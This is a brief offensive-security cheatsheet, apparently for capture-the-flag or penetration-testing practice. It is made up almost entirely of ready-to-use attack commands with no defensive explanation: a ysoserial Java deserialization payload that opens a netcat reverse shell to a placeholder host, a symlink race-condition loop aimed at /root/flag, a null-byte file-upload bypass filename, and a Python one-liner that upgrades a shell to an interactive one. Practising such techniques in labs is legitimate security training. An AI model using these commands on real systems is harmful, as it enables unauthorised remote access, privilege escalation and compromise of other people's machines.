# 🧪 Misc Techniques Cheatsheet

## Deserialization Exploit (Java)
```bash
java -jar ysoserial.jar CommonsCollections1 'nc <IP> <PORT> -e /bin/sh' > payload.ser
```

## Race Conditions
```bash
while true; do ln -sf /root/flag target; done
while true; do ./vulnerable target; done
```

## Upload Bypass
```bash
image.php%00.jpg
```

## Better Interactive Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```